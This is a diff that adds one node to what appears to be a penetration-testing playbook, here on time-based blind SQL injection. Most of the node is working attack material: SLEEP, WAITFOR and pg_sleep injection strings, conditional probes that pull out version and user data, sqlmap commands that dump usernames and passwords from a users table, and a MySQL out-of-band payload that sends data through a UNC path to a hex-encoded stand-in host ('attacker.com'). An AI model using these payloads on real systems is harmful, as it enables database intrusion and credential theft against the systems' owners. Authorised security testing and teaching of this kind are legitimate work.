@@ -1,0 +1,22 @@
+{
+  "id": "sqli_time",
+  "phase": "WEB",
+  "title": "SQLi — Time-Based Blind",
+  "body": "Last resort — no visible response difference at all. PortSwigger: infer data from deliberate delays. Network latency makes this unreliable. Confirm then use sqlmap.",
+  "cmd": "# -- CONFIRM TIME-BASED -------------------\n# MySQL SLEEP — expect 5 second delay\n' AND SLEEP(5)--\n' AND IF(1=1,SLEEP(5),0)--\n\n# MSSQL WAITFOR\n'; WAITFOR DELAY '0:0:5'--\n\n# PostgreSQL pg_sleep\n'; SELECT pg_sleep(5)--\n\n# -- CONDITIONAL EXTRACTION ---------------\n# Confirm technique before sqlmap\n' AND IF(substring(version(),1,1)='8',SLEEP(3),0)--\n' AND IF((SELECT user())='root',SLEEP(3),0)--\n\n# -- SQLMAP TIME-BASED --------------------\nsqlmap -u \"http://$ip/page?id=1\"   --technique=T --time-sec=5 --batch --level=3   --current-db\n\nsqlmap -u \"http://$ip/page?id=1\"   --technique=T --time-sec=5 --batch   -D [dbname] -T users -C username,password --dump\n\n# -- OUT-OF-BAND FALLBACK -----------------\n# MySQL DNS exfil (requires outbound DNS)\n' AND load_file(concat(0x5c5c5c5c,(SELECT version()),0x2e,0x61747461636b65722e636f6d,0x5c5c,0x7368617265))--\n# Use interactsh or Burp Collaborator to catch callback",
+  "warn": "Server load makes time-based unreliable — a busy server looks the same as a SLEEP(5). Increase --time-sec=8 on slow networks. If delays are wildly inconsistent, the technique won't work reliably.",
+  "choices": [
+    {
+      "label": "sqlmap confirmed — extracting",
+      "next": "sqli_sqlmap"
+    },
+    {
+      "label": "Got credentials",
+      "next": "creds_found"
+    },
+    {
+      "label": "Unstable — look for other vectors",
+      "next": "web_fuzz_deep"
+    }
+  ]
+}
